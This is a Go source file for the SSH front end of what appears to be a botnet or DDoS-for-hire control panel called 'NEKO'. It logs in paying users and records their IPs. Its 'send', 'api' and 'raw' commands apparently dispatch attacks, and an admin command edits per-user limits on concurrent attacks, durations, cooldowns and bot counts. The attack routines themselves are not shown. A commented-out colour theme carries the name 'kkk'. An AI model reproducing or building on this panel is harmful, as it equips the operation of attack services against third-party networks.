package main

import (
    "fmt"
    "io/ioutil"
    "time"
    "golang.org/x/term"
    "strings"
    "github.com/gliderlabs/ssh"
    "log"
    "github.com/tidwall/gjson"
)

func sshserver(port string) {
    ssh.Handle(func(s ssh.Session) {
        var loggedIn bool
        var userInfo AccountInfo
        clientaddr := s.RemoteAddr().String()
        currentD := time.Now()
        Logtime := currentD.Format("01-02-2006 15:04:05")
        if loggedIn, userInfo = database.sshLogin(s.User()); !loggedIn {
        if !database.FailedLog(Logtime, s.User(), clientaddr) {
            fmt.Fprint(s, "Failed to log "+clientaddr+"!")
            time.Sleep(time.Second * 5)
            return
        }
        fmt.Fprint(s, "\033[2J\033[1;1H")//s.RemoteAddr().String()
        fmt.Fprint(s, "No nekos for you!\r\n")
        fmt.Fprint(s, "LOGGED: "+clientaddr)
        time.Sleep(time.Second * 5)
        return
    }
        themconfig, err := ioutil.ReadFile("themes.json")
        if err != nil {
            fmt.Println("ERROR\nconfig.json not found!\n")
        }
        confile := string(themconfig)
    _ = userInfo
        checksession := usersSessions(s.User())
        if s.User() != "test"{
            if len(checksession) > 0{
                fmt.Fprint(s, "\033[2J\033[1;1H")
                fmt.Fprint(s, "User already logged in!\n")
                time.Sleep(time.Second * 5)
                return
            }
        }
        sess := addSession(s.User())
        defer sess.Remove()
        //clientIp := s.RemoteAddr().String()
        //colarry := (gjson.Get(confile, "reg.colors")).String()
        var P = (gjson.Get(confile, "reg.colors.0")).String()
        var D = (gjson.Get(confile, "reg.colors.1")).String()
        var G = (gjson.Get(confile, "reg.colors.2")).String()
        var B = (gjson.Get(confile, "reg.colors.3")).String()
        /*
        var P = (gjson.Get(confile, "reg.colors.col1")).String()
        var D = (gjson.Get(confile, "reg.colors.col2")).String()
        var G = (gjson.Get(confile, "reg.colors.col3")).String()
        var B = (gjson.Get(confile, "reg.colors.col4")).String()
        //P, D, G, B := (gjson.Get(confile, "reg.colors")).Array()
        var P = "\x1b[38;5;197m"
        var D = "\x1b[38;5;198m"
        var G = "\x1b[38;5;199m"
        var B = "\x1b[38;5;200m"*/
        
        if !database.UserLogs(Logtime, s.User(), clientaddr) {
            fmt.Fprint(s, "Failed to log "+clientaddr+P+"!")
            time.Sleep(time.Second * 5)
            return
        }
        sshloads(s, P, D, G, B)
        fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand("banner")))
        go func () {
            for {
            ioTitle, err := ioutil.ReadFile("title.txt")
            if err != nil {
                fmt.Fprint(s, "\033]0;No Title Loaded\007")
                time.Sleep(time.Second * 10)
                continue
            }
            nekoTitle := string(ioTitle)
            _ = nekoTitle
            fmt.Fprint(s, "\033]0;"+termFx(s.User(), P, D, G, B, nekoTitle)+"\007")
            time.Sleep(time.Second * 1)
            
            }
        }()
        banner := "clear"
        cursor := (gjson.Get(confile, "reg.cursor")).String()// CURSOR CALL 
        for {//[neko]~$  « neko »
             //
            //ioPrompt, err := ioutil.ReadFile("prompt.txt")
            //nekoPrompt:= string(ioPrompt)
            fmt.Fprint(s, "\x1b[0m")
            //if err != nil {
            //    nekoPrompt = "No Prompt > "
            //}
            //_ = nekoPrompt
            cursor1 := string(termFx(s.User(), P, D, G, B, cursor))
            if err != nil {
                cursor1 = "No Prompt > "
            }
            fmt.Fprint(s, cursor1)
            //cursor := string("\x1b[38;5;242m["+P+"neko\x1b[38;5;242m]\x1b[38;5;242m~"+P+"$ \x1b[38;5;242m")
            input := term.NewTerminal(s, "")
            inputcmd, err := input.ReadLine()
            if err != nil {
                _ = err
                return
            }
            inputcmd = strings.ToLower(string(inputcmd))
            cmd := strings.Split(inputcmd, " ")
            fmt.Fprint(s, "\x1b[0m")
            if userInfo.admin == 1 && inputcmd == "check" {
                onlineList(s, P, D, G, B)
                continue
            }
            if cmd[0] == "lookup" {
                if len(cmd) != 2 {
                    fmt.Fprint(s , "Neko╼➤   ERROR #lookup [ip]\n")
                    continue
                }
                lookup(s, cmd[1], P, D, G, B)
                continue
            }
            if userInfo.admin == 1 && cmd[0] == "update" {
                updaterr := "Neko╼➤   ERROR #update [username] [area] [new value]\n          EX. update test concurrents 2\n          Column areas:\n          id , username , password , concurrents ,\n          duration_limit , api_duration_limit , cooldown ,\n          last_paid , max_bots , admin ,\n          redeemed , api_key \n"
                if len(cmd) != 4 {
                    fmt.Fprint(s ,updaterr)
                    continue
                }
                if !contains(mysqlcol, cmd[2]){
                    fmt.Fprint(s ,updaterr)
                    continue
                }
                if !database.updateUser(cmd[1], cmd[2], cmd[3]) {
                    fmt.Fprint(s ,updaterr)
                }
                fmt.Fprint(s , "Updated "+cmd[1]+"'s "+cmd[2]+" to "+cmd[3]+"!\n")
                continue

            }
            if cmd[0] == "send" {
                sshsending(P, D, G, B,s,inputcmd)
                continue

            }
            if cmd[0] == "api" {
                apisending(P, D, G, B,s,inputcmd)
                continue

            }
            if cmd[0] == "raw" {
                rawsending(P, D, G, B,s,inputcmd)
                continue

            }
            if inputcmd == "logout" {
                defer sess.Remove()
                return
            }
            /*
            if inputcmd == "reg" {
                P = "\x1b[38;5;197m"
                D = "\x1b[38;5;198m"
                G = "\x1b[38;5;199m"
                B = "\x1b[38;5;200m"
                banner = "banner"


                fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand(banner)))
                continue
            }
            if inputcmd == "hh" {
                P = "\x1b[38;5;231m"
                D = "\x1b[38;5;160m"
                G = "\x1b[38;5;242m"
                B = "\x1b[38;5;231m"
                banner = inputcmd
                fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand(inputcmd)))
                continue
            }
            if inputcmd == "kkk" {
                P = "\x1b[38;5;124m"
                D = "\x1b[38;5;160m"
                G = "\x1b[38;5;196m"
                B = "\x1b[38;5;242m"
                banner = inputcmd
                fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand(inputcmd)))
                continue
            }
            if inputcmd == "bl" {
                P = "\x1b[38;5;54m"
                D = "\x1b[38;5;55m"
                G = "\x1b[38;5;56m"
                B = "\x1b[38;5;57m"
                banner = "banner"

                fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand(banner)))
                continue
            }
            if inputcmd == "op" {
                P = "\033[38;5;172m"
                D = "\033[38;5;173m"
                G = "\033[38;5;174m"
                B = "\033[38;5;175m"
                banner = "banner"

                fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand(banner)))
                continue
            }
            if inputcmd == "gt" {
                P = "\033[38;5;82m"
                D = "\033[38;5;83m"
                G = "\033[38;5;84m"
                B = "\033[38;5;85m"
                banner = "banner"

                fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand(banner)))
                continue
            }
            if inputcmd == "wtf" {
                P = "\033[38;5;9m"
                D = "\033[38;5;10m"
                G = "\033[38;5;11m"
                B = "\033[38;5;12m"
                banner = "banner"
                fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand(banner)))
                continue
            }
            if inputcmd == "ph" {
                P = "\x1b[38;5;208m"
                D = "\x1b[38;5;208m"
                G = "\x1b[38;5;243m"
                B = "\x1b[38;5;243m"
                banner = "banner"
                fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand(banner)))
                continue
            }*/
            if inputcmd == "clear" || inputcmd == "cls" || inputcmd == "c" {
                fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand("clear")))
                continue
            }

            if istheme(inputcmd) == true {
                banner, P, D, G, B, cursor = changetheme(inputcmd)
                fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand(banner)))
                continue
            }

            fmt.Fprint(s, termFx(s.User(), P, D, G, B, fileCommand(cmd[0])))    //[test@N-E-K-O-]~# 

        }
        return
    })

    fmt.Println("[NEKO:ssh] ssh server bound on port "+port+"!")
    //log.Fatal(ssh.ListenAndServe(":"+port, nil, ssh.PasswordAuth(checkPass)))ssh.NoPty()
    log.Fatal(ssh.ListenAndServe(":"+port, nil, ssh.PasswordAuth(database.boolLogin)))
    //log.Fatal(ssh.ListenAndServe(":"+port, nil, ssh.NoPty()))
}

